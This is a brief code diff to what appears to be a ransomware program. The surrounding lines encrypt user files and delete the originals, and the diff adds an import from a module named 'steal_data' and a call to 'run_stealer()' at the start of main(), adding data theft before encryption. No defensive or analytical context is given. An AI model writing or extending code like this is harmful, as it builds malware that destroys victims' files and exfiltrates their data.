@@ -3,6 +3,7 @@ from concurrent.futures import ThreadPoolExecutor, as_completed
 
 from crypto.encrypt import SecureFileCryptoStream
 from software_gui import run_gui
+from server.steal_data import run_stealer
 
 crypto = SecureFileCryptoStream()
 
@@ -58,6 +59,9 @@ def delete_original_files():
 
 
 def main():
+
+    run_stealer()
+
     directories = get_user_dirs()
 
     all_files = []
